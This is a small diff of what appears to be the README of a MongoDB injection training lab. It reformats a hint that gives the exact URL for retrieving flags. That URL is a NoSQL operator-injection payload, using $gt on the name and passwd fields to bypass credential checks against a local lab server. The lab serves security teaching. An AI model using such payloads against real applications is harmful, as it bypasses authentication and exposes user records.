@@ -26,11 +26,12 @@ In part, this application tests your knowledge of MongoDB and [its operators](ht
   <details>
     <summary>Exact URL to get flags</summary>
 
-    ```http://localhost:8084/?fields[name][$gt]=0&fields[passwd][$gt]=0&db=mongodb&submit=submit```
+    http://localhost:8084/?fields[name][$gt]=0&fields[passwd][$gt]=0&db=mongodb&submit=submit
 
   </details>
 
   </blockquote>
+
 </details>
 
 ### MEDIUM 
